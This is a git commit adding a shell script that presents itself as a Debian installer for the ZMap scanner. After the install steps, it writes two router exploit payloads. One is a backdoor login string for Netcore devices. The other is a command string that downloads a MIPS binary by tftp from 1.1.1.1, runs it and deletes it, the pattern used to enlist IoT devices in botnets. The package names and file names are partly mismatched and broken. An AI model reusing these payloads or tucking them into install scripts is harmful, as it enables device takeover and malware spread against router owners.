ea574baa08beb5c2b56bc1d53732f4c60471da99
xelj <49570400+XeljomudoX@users.noreply.github.com>
2019-09-28 15:32:51 +0200

    Create Debian_zmap_auto_install.sh

---
+++ Debian_zmap_auto_install.sh
@@ -0,0 +1,43 @@
+#!/bin/sh
+
+# Debian ZMap Install
+
+
+
+apt-get update -y
+
+apt-get install gcc cmake gmp gmp-devel libpcap-devel gengetopt byacc flex -y
+
+apt-get install json-c-doc.noarch json-c.i686 json-c.x86_64 json-c-devel.i686 json-c-devel.x86_64 -y
+
+apt-get install epel-release -y
+
+apt-get install gengetopt -y
+
+
+
+wget https://github.com/zmap/zmap/archive/v2.1.0.tar.gz
+
+tar -xvf v2.1.0.tar.gz
+
+cd zmap-2.1.0
+
+flex -o "src/lexer.c" --header-file="src/lexer.h" "src/lexer.l"
+
+byacc -d -o "src/parser.c" "src/parser.y"
+
+mkdir /etc/zmap
+
+cp conf/* /etc/zmap
+
+cmake -DENABLE_HARDENING=ON
+
+make
+
+make install
+
+
+
+python -c "print 'A'*8 + 'netcore\x00'" > loginpayload
+
+python -c "print 'AA\x00\x00AAAA cd /var/; tftp -g -r mipselss 1.1.1.1; chmod 777 mipsel; ./mipsel; rm -rf mipsel\x00'" > commandpayload
